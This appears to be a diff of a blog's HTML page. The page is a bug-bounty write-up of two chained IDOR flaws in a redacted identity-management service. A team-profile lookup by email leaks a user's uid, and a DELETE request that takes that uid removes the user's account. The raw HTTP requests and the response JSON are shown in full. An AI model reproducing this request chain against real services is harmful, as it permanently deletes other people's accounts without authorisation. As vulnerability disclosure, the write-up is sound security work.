@@ -21,7 +21,7 @@ Lets get started, The website provides cloud-based consumer identity and access 
 <p>Lets get started, The website provides cloud-based consumer identity and access management (CIAM) solution.
 For testing purposes i signup using my account, select developer pro(extra features), created a app and looked for every features of the website, 1 hour later i decided to play with the delete account feature from the settings page. I request for the delete account and checked the request in burpsuite and send the request to repeater and drop it.</p>
 <p>The request looked like this(1st IDOR):</p>
-<pre><code>DELETE /account/customer? HTTP/1.1
+<pre tabindex="0"><code>DELETE /account/customer? HTTP/1.1
 Host: redacted-api.redacted.com
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
 Accept: application/json, text/plain, */*
@@ -38,12 +38,12 @@ Referer: https://dashboard.redacted.com/profile
 Te: trailers
 Connection: close
 
-{&quot;uid&quot;:&quot;4adddbea4e3646a0b951ce4822075707&quot;}
+{&#34;uid&#34;:&#34;4adddbea4e3646a0b951ce4822075707&#34;}
 </code></pre><p>Now, after looking the request, we can easily identify uid(user identification) parameter is used so the website maybe prone to idor.
 I made 2nd account and request for the delete account feature, the request was exactly same and uid is different. I copy the uid code of the 2nd account and replace uid code with first request&rsquo;s code. After sending the request the my 2nd account was successfully deleted.(1st IDOR)</p>
 <p>Here the impact is nothing because how will the attacker get&rsquo;s the victim&rsquo;s uid. So i needed to find the victim&rsquo;s uid.</p>
 <p>After spending some time with the website, i found that i can invite a team-member to my app which i created when signing up in the website. So i invited the user to my app and checked the requests made by website. While checking i found this interesting request:</p>
-<pre><code>GET /team/userprofile?email=nexas60891%40rebation.com&amp; HTTP/1.1
+<pre tabindex="0"><code>GET /team/userprofile?email=nexas60891%40rebation.com&amp; HTTP/1.1
 Host: adminconsole-api.redacted.com
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
 Accept: application/json, text/plain, */*
@@ -57,10 +57,9 @@ Origin: https://dashboard.redacted.com
 Referer: https://dashboard.redacted.com/teams
 Te: trailers
 Connection: close
-
 </code></pre><p>I send the request to the repeater and send the request. The request showed some information related to the victim&rsquo;s email including uid code.
 Response:</p>
-<pre><code>HTTP / 1.1 200 OK
+<pre tabindex="0"><code>HTTP / 1.1 200 OK
 Server: nginx
 Date: Fri, 10 Sep 2021 05: 11: 57 GMT
 Content - Type: application / json;
@@ -70,7 +69,7 @@ aca - request - id: 9 f2c40e0 - 11 f5 - 11e c - b525 - 9 f29fd8a2e9a
 Access - Control - Allow - Headers: Content - Type, Cache - Control, Authorization, Content - Length, X - Requested - With, X - Is - redacted - Ajax, X - Is - redacted--Token, X - Is - redacted--Sign
 Access - Control - Allow - Methods: GET, PUT, POST, DELETE, OPTIONS
 Access - Control - Allow - Origin: https: //dashboard.redacted.com
-  ETag: W / &quot;d8d-UnkAQfkFjrEDJEI34fj1dAMTHHw&quot;
+  ETag: W / &#34;d8d-UnkAQfkFjrEDJEI34fj1dAMTHHw&#34;
 Strict - Transport - Security: max - age = 1234000;
 includeSubDomains
 Vary: Origin, Accept - Encoding
@@ -83,67 +82,67 @@ Access - Control - Max - Age: 3600
 Content - Length: 3469
 
 {
-  &quot;Identities&quot;: null,
-  &quot;Password&quot;: &quot;**********&quot;,
-  &quot;LastPasswordChangeDate&quot;: null,
-  &quot;PasswordExpirationDate&quot;: &quot;2021-12-08T11:51:01.6230000Z&quot;,
-  &quot;LastPasswordChangeToken&quot;: null,
-  &quot;EmailVerified&quot;: true,
-  &quot;IsActive&quot;: true,
-  &quot;IsDeleted&quot;: false,
-  &quot;Uid&quot;: &quot;858fb2cafd0c454096322e30d059722a&quot;,
-  &quot;CustomFields&quot;: {
-    &quot;IsPrivacyPolicyAccepted&quot;: &quot;false&quot;,
-    &quot;gclid&quot;: &quot;&quot;,
-    &quot;utm_campaign&quot;: &quot;&quot;,
-    &quot;utm_medium&quot;: &quot;&quot;,
-    &quot;utm_source&quot;: &quot;&quot;,
-    &quot;cf_PlanType&quot;: &quot;{\&quot;rebation-roqagari\&quot;:\&quot;free\&quot;}&quot;,
-    &quot;roleInfo&quot;: &quot;{\&quot;role\&quot;:\&quot;Developer\&quot;,\&quot;lookingFor\&quot;:\&quot;for product research\&quot;}&quot;
+  &#34;Identities&#34;: null,
+  &#34;Password&#34;: &#34;**********&#34;,
+  &#34;LastPasswordChangeDate&#34;: null,
+  &#34;PasswordExpirationDate&#34;: &#34;2021-12-08T11:51:01.6230000Z&#34;,
+  &#34;LastPasswordChangeToken&#34;: null,
+  &#34;EmailVerified&#34;: true,
+  &#34;IsActive&#34;: true,
+  &#34;IsDeleted&#34;: false,
+  &#34;Uid&#34;: &#34;858fb2cafd0c454096322e30d059722a&#34;,
+  &#34;CustomFields&#34;: {
+    &#34;IsPrivacyPolicyAccepted&#34;: &#34;false&#34;,
+    &#34;gclid&#34;: &#34;&#34;,
+    &#34;utm_campaign&#34;: &#34;&#34;,
+    &#34;utm_medium&#34;: &#34;&#34;,
+    &#34;utm_source&#34;: &#34;&#34;,
+    &#34;cf_PlanType&#34;: &#34;{\&#34;rebation-roqagari\&#34;:\&#34;free\&#34;}&#34;,
+    &#34;roleInfo&#34;: &#34;{\&#34;role\&#34;:\&#34;Developer\&#34;,\&#34;lookingFor\&#34;:\&#34;for product research\&#34;}&#34;
   },
-  &quot;IsEmailSubscribed&quot;: false,
-  &quot;UserName&quot;: null,
-  &quot;NoOfLogins&quot;: 2,
-  &quot;PhoneId&quot;: null,
-  &quot;PhoneIdVerified&quot;: false,
-  &quot;Roles&quot;: null,
-  &quot;ExternalUserLoginId&quot;: null,
-  &quot;RegistrationProvider&quot;: &quot;Email&quot;,
-  &quot;IsLoginLocked&quot;: false,
-  &quot;LoginLockedType&quot;: &quot;None&quot;,
-  &quot;LastLoginLocation&quot;: &quot;redacted, India&quot;,
-  &quot;RegistrationSource&quot;: &quot;https://accounts.redacted.com/auth.aspx?return_url=https://dashboard.redacted.com/login&amp;action=register&amp;source=email&quot;,
-  &quot;IsCustomUid&quot;: false,
-  &quot;UnverifiedEmail&quot;: null,
-  &quot;IsSecurePassword&quot;: null,
-  &quot;PrivacyPolicy&quot;: null,
-  &quot;ExternalIds&quot;: null,
-  &quot;IsRequiredFieldsFilledOnce&quot;: true,
-  &quot;ConsentProfile&quot;: null,
-  &quot;PIN&quot;: null,
-  &quot;RegistrationData&quot;: null,
-  &quot;ID&quot;: &quot;69877142c7644ef8a954a0a07f05cdca&quot;,
-  &quot;Provider&quot;: &quot;Email&quot;,
-  &quot;Prefix&quot;: null,
-  &quot;FirstName&quot;: &quot;Victim&quot;,
-  &quot;MiddleName&quot;: null,
-  &quot;LastName&quot;: null,
-  &quot;Suffix&quot;: null,
-  &quot;FullName&quot;: &quot;Victim&quot;,
-  &quot;Email&quot;: [{
-    &quot;Type&quot;: &quot;Primary&quot;,
-    &quot;Value&quot;: &quot;nexas60891@rebation.com&quot;
+  &#34;IsEmailSubscribed&#34;: false,
+  &#34;UserName&#34;: null,
+  &#34;NoOfLogins&#34;: 2,
+  &#34;PhoneId&#34;: null,
+  &#34;PhoneIdVerified&#34;: false,
+  &#34;Roles&#34;: null,
+  &#34;ExternalUserLoginId&#34;: null,
+  &#34;RegistrationProvider&#34;: &#34;Email&#34;,
+  &#34;IsLoginLocked&#34;: false,
+  &#34;LoginLockedType&#34;: &#34;None&#34;,
+  &#34;LastLoginLocation&#34;: &#34;redacted, India&#34;,
+  &#34;RegistrationSource&#34;: &#34;https://accounts.redacted.com/auth.aspx?return_url=https://dashboard.redacted.com/login&amp;action=register&amp;source=email&#34;,
+  &#34;IsCustomUid&#34;: false,
+  &#34;UnverifiedEmail&#34;: null,
+  &#34;IsSecurePassword&#34;: null,
+  &#34;PrivacyPolicy&#34;: null,
+  &#34;ExternalIds&#34;: null,
+  &#34;IsRequiredFieldsFilledOnce&#34;: true,
+  &#34;ConsentProfile&#34;: null,
+  &#34;PIN&#34;: null,
+  &#34;RegistrationData&#34;: null,
+  &#34;ID&#34;: &#34;69877142c7644ef8a954a0a07f05cdca&#34;,
+  &#34;Provider&#34;: &#34;Email&#34;,
+  &#34;Prefix&#34;: null,
+  &#34;FirstName&#34;: &#34;Victim&#34;,
+  &#34;MiddleName&#34;: null,
+  &#34;LastName&#34;: null,
+  &#34;Suffix&#34;: null,
+  &#34;FullName&#34;: &#34;Victim&#34;,
+  &#34;Email&#34;: [{
+    &#34;Type&#34;: &#34;Primary&#34;,
+    &#34;Value&#34;: &#34;nexas60891@rebation.com&#34;
   }],
-  &quot;Country&quot;: null,
-  &quot;Positions&quot;: null,
-  &quot;Educations&quot;: null,
-  &quot;PhoneNumbers&quot;: null,
-  &quot;IMAccounts&quot;: null,
-  &quot;Addresses&quot;: null,
-  &quot;MainAddress&quot;: null,
-  &quot;Created&quot;: null,
-  &quot;CreatedDate&quot;: &quot;null&quot;,
-  &quot;ModifiedDate&quot;: &quot;null&quot;,
+  &#34;Country&#34;: null,
+  &#34;Positions&#34;: null,
+  &#34;Educations&#34;: null,
+  &#34;PhoneNumbers&#34;: null,
+  &#34;IMAccounts&#34;: null,
+  &#34;Addresses&#34;: null,
+  &#34;MainAddress&#34;: null,
+  &#34;Created&#34;: null,
+  &#34;CreatedDate&#34;: &#34;null&#34;,
+  &#34;ModifiedDate&#34;: &#34;null&#34;,
 }
 </code></pre><p>I copy the uid from this response and replace with uid code in the 1st acccount&rsquo;s request -&gt; Send the request -&gt; The victim&rsquo;s account was permanently deleted.</p>
 <ul>
